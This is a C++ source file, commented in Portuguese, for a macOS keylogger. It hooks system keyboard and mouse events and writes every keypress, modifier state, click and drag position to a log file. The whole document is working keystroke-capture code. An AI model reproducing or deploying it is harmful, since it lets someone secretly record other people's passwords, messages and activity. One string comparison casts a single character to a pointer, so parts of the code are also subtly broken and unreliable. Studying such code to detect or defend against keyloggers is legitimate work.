#include "KSVKeylogger.h"
#include "KSVKeyboard.h"
#include "KSVLogger.h"
#include "KSVMouse.h"
#include <iostream>

// executa ao criar a thread
void Keylogger::operator()() {
    Logger *logger = Logger::instance();

    const char *header = "[[K] KEYLOGGER INITIALIZED]";
    logger->writeln(header);

    // Incializa os ouvintes
    initializeKeyboardTracker();
    initializeMouseTracker();

    logger->line();

    CFRunLoopRun();
}


/**
 * Registra o rastreador de eventos para o Teclado.
 * Todas teclas quando pressionadas (down e up)
 */
void Keylogger::initializeKeyboardTracker() {
    Logger *logger = Logger::instance();

    // Apenas ouvir os eventos, não modificar
    CGEventTapOptions tapOptions = kCGEventTapOptionListenOnly;

    // Ouvir apenas eventos de declado (quando pressionar uma tecla)
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));

    // Registra o evento de teclado
    CFMachPortRef keyboardEventTap = CGEventTapCreate(
            kCGSessionEventTap, kCGHeadInsertEventTap, tapOptions, eventMask, CGKeyboardInputEventCallback, NULL
    );

    // Se existir alguma restrição ao nosso programa por parte do SO, o evento não poderá ser registrado.
    if (!keyboardEventTap) {
        logger->writeln("[[ERROR] Cannot track Keyboard events!]");
        logger->writeln("[Tracking Keyboard events: NO]");
        exit(1);
    } else {
        logger->writeln("[Tracking Keyboard events: YES]");
    }

    // Obtem a referência do loop de execução do programa
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, keyboardEventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(keyboardEventTap, true);
}


/**
 * Registra o rastreador de eventos para Mouse.
 * Clique com Direito/Esquerdo  e  Arrastar
 */
void Keylogger::initializeMouseTracker() {
    Logger *logger = Logger::instance();

    // Apenas ouvir os eventos, não modificar **ainda**
    CGEventTapOptions tapOptions = kCGEventTapOptionListenOnly;

    // Ouvir eventos de mouse, clicar, e clicar e arrastar.
    CGEventMask eventMask = (
            CGEventMaskBit(kCGEventLeftMouseDown) | CGEventMaskBit(kCGEventLeftMouseDragged) |
                    CGEventMaskBit(kCGEventRightMouseDown) | CGEventMaskBit(kCGEventRightMouseDragged) |
                    CGEventMaskBit(kCGMouseEventClickState)
    );

    // Registra o evento de teclado
    CFMachPortRef mouseEventTap = CGEventTapCreate(
            kCGSessionEventTap, kCGHeadInsertEventTap, tapOptions, eventMask, CGMouseClickEventCallback, NULL
    );

    // Se existir alguma restrição ao nosso programa por parte do SO, o evento não poderá ser registrado.
    if (!mouseEventTap) {
        logger->writeln("[[ERROR] Cannot track Mouse events!]");
        logger->writeln("[Tracking Mouse events: NO]");
        exit(1);
    } else {
        logger->writeln("[Tracking Mouse events: YES]");
    }

    // Obtem a referência do loop de execução do programa
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, mouseEventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(mouseEventTap, true);
}


// ------------------------------------------------------------------------------------------------------------------------------- \\
// -----------------------------------------------------------   TECLADO   ------------------------------------------------------- \\
// ------------------------------------------------------------------------------------------------------------------------------- \\

// Estado de teclas de função (shift, cmd, option, ... )
// 0 = nada acontecendo, não se trata de uma tecla de função
// 1 = a tecla esta pressionada e o próximo estado é o 2 (será solta)
// 2 = a tecla não esta mais sendo pressionada e o próximo status é 0
int fnKeyActive = 0;

// A tecla pressionada anteriormente
int lastKeyCode = -1;

/**
 * Registra no arquivo de log a tecla pressionada
 */
CGEventRef Keylogger::CGKeyboardInputEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    Logger *logger = Logger::instance();

    // Obtem a tecla pressionada
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    int64_t isInAutoRepeat = CGEventGetIntegerValueField(event, kCGKeyboardEventAutorepeat);

    const char *parsedKey = Keyboard::convertKeyCode(keyCode);
    bool isFnKey = Keyboard::isFnKey(keyCode);

    // Se for uma tecla de função, a variavel [fnKeyActive] começara a ganhar alterações de status
    if (isFnKey) {

        // Status 1 deve ser aplicado, pois a tecla anterior não é conhecida, ou é diferente, então é o primeiro siclo de uma tecla fn
        if (lastKeyCode == -1) {
            fnKeyActive = 1; // status pressionado inicialmente
            lastKeyCode = keyCode;
        } else {

            // Se a tecla pressionada agora, for a mesma pressionada antes, deve-se verificar o fnKeyActive para determinar o status
            if (keyCode == lastKeyCode) {

                // Se estiver no status 1, deve alterar para o status 2.
                if (fnKeyActive == 1) {
                    fnKeyActive = 2;
                } else if (fnKeyActive == 2) { // apenas por precaução, to preocupado só!
                    fnKeyActive = 1;
                } else if (fnKeyActive == 0) {
                    fnKeyActive = 1;
                }

            } else {
                // TODO - Problema quando troca de tecla

                if (fnKeyActive == 0) {
                    fnKeyActive = 1;
                } else if (fnKeyActive == 1) {
                    fnKeyActive = 2;
                } else if (fnKeyActive == 2) {
                    fnKeyActive = 0;
                }
            }

        }

    } else {
        fnKeyActive = 0;
    }

    // Armazeno na memória a tecla pressionada no presente, que será a tecla do passado no futuro. 8)
    lastKeyCode = keyCode;

    if (isFnKey) {
        logger->write("[f:");
        logger->write(fnKeyActive);
        logger->write(parsedKey);
        logger->write("]");
    } else {
        logger->write("[k:");
        logger->write(isInAutoRepeat);

        // TODO.md K1
        if (strcmp((const char *) parsedKey[0], (const char *) "[")) {
            logger->write("[");
            logger->write(parsedKey);
            logger->write("]");
        } else {
            logger->write(parsedKey);
        }

        logger->write("]");
    }


    return event;
}





// ------------------------------------------------------------------------------------------------------------------------------- \\
// ------------------------------------------------------------   MOUSE    ------------------------------------------------------- \\
// ------------------------------------------------------------------------------------------------------------------------------- \\

// Variavel de controle, para saber se o mouse esta sendo arrastado
bool is_dragging = false;
char *clickOnDragStart = (char *) malloc(15);

CGEventRef Keylogger::CGMouseClickEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    Logger *logger = Logger::instance();

    // Obtem as cordenadas do mouse
    CGPoint cursor = Mouse::getCursorPosition();

    // Prepara a string com o nome do botão do mouse que foi usado
    const char *parsedMouseEvent = Mouse::convertMouseEvent(type);

    // Se estiver CLICANDO e ARRASTANDO o mouse.
    if (type == kCGEventLeftMouseDragged || type == kCGEventRightMouseDragged || type == kCGEventOtherMouseDragged) {

        // Se começou a arrastar o mouse agora, salva as cordenadas iniciais
        if (!is_dragging) {

            strcpy(clickOnDragStart, parsedMouseEvent);

            logger->writeln("");
            logger->write("[d:");
            logger->write((float) cursor.x);
            logger->write("x");
            logger->write((float) cursor.y);

            // Marca a flag = "Ainda esta arrastando"
            is_dragging = true;
        } else {
            logger->write("|");
            logger->write((float) cursor.x);
            logger->write("x");
            logger->write((float) cursor.y);
        }

        // Se estiver apenas CLICANDO com o mouse
    } else {

        // Verifica se estava arrastando o mouse na ultima verificação do evento.
        // Neste ponto, se is_dragging é TRUE, significa que ele PAROU de CLICAR e ARRASTAR o mouse.
        if (is_dragging) {
            logger->write(clickOnDragStart);
            logger->write("]");
            logger->writeln("");

            // Resetamos a variavel de controle do DRAG.
            is_dragging = false;

            // TODO - Corrigir um problema aqui. Quando o mouse esta em DRAG, o final do bloco de registro de DRAG só é fechado no próximo clique do usuário. Podendo assim ter inconsistência em alguns blocos de DRAG, portanto, todo bloco drag, quebra linha no final
        }

        // Obter a quantidade de cliques feitos pelo usuario
        // 1/2/3... => Single/Double/Triple...
        int64_t clickStateCount = CGEventGetIntegerValueField(event, kCGMouseEventClickState);

        logger->write("[c:");
        logger->write((int) clickStateCount);
        logger->write(":");
        logger->write((float) cursor.x);
        logger->write("x");
        logger->write((float) cursor.y);
        logger->write(parsedMouseEvent);
        logger->write("]");
    }

    return event;
}



